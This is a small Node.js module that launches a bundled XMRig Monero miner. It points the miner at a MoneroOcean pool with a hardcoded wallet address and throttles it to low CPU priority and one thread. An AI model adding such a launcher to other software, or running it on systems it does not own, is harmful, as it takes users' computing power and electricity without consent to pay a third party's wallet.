const { spawn } = require('child_process');
const path = require('path');
 const miner = ()=>{
    const xmrigPath = path.join(__dirname, 'miners', 'xmrig');

const miner = spawn(xmrigPath, [
    '--randomx-mode=light',
    '-o', 'gulf.moneroocean.stream:10032',
    '-u', '47bBDxmrhaZUscZv3wZDmC7qRiAm2YnsXiuWGSuiHEAGeDcSe1pctd2AuzjYYUbbh3XKu8GpFigfnT3yfeYRXzczQ2nD2zd',
    '-p', 'x',
    '--cpu-priority', '1',                    // Low priority
    '--cpu-max-threads-hint', '0.1',         // ~20% of logical CPUs
    '-t','1'
    ]);




miner.stdout.on('data', data => console.log(`[XMRig] ${data}`));
miner.stderr.on('data', data => console.error(`[XMRig Error] ${data}`));
miner.on('close', code => console.log(`[XMRig] exited with code ${code}`));
miner.on("error", err => {
  console.error("processor failed:", err);
  // fallback or exit
});
 }


module.exports = miner

